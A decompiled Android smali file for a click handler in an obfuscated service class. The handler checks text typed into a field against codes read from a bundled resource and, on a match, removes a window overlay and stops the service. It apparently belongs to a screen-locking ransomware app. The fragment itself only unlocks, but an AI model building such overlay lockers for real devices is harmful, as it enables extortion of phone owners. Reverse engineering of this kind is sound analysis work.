.class Lcom/h/s$100000001;
.super Ljava/lang/Object;
.source "s.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/h/s;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# instance fields
.field private final this$0:Lcom/h/s;


# direct methods
.method constructor <init>(Lcom/h/s;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    return-void
.end method

.method static access$0(Lcom/h/s$100000001;)Lcom/h/s;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/View;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 206
    move-object v0, p0

    move-object v1, p1

    move-object v7, v0

    :try_start_0
    iget-object v7, v7, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    invoke-virtual {v7}, Lcom/h/s;->getResources()Landroid/content/res/Resources;

    move-result-object v7

    const/high16 v8, 0x7f060000

    invoke-virtual {v7, v8}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v7

    move-object v2, v7

    .line 207
    new-instance v7, Ljava/io/InputStreamReader;

    move-object v11, v7

    move-object v7, v11

    move-object v8, v11

    move-object v9, v2

    const-string v10, "UTF-8"

    invoke-direct {v8, v9, v10}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    move-object v3, v7

    .line 208
    new-instance v7, Ljava/io/BufferedReader;

    move-object v11, v7

    move-object v7, v11

    move-object v8, v11

    move-object v9, v3

    invoke-direct {v8, v9}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v4, v7

    .line 209
    const-string v7, ""

    move-object v5, v7

    .line 210
    :cond_0
    :goto_0
    move-object v7, v4

    invoke-virtual {v7}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v7

    move-object v11, v7

    move-object v7, v11

    move-object v8, v11

    move-object v5, v8

    if-nez v7, :cond_1

    .line 222
    :goto_1
    return-void

    .line 211
    :cond_1
    const-string v7, "info"

    move-object v8, v5

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    move-result v7

    .line 212
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    iget-object v7, v7, Lcom/h/s;->ed:Landroid/widget/EditText;

    invoke-virtual {v7}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v7

    invoke-interface {v7}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v7

    move-object v8, v5

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 214
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    invoke-static {v7}, Lcom/h/s;->access$L1000001(Lcom/h/s;)Landroid/view/WindowManager;

    move-result-object v7

    move-object v8, v0

    iget-object v8, v8, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    invoke-static {v8}, Lcom/h/s;->access$L1000002(Lcom/h/s;)Landroid/view/View;

    move-result-object v8

    invoke-interface {v7, v8}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 215
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s$100000001;->this$0:Lcom/h/s;

    invoke-virtual {v7}, Lcom/h/s;->stopSelf()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 210
    :catch_0
    move-exception v7

    move-object v2, v7

    goto :goto_1
.end method
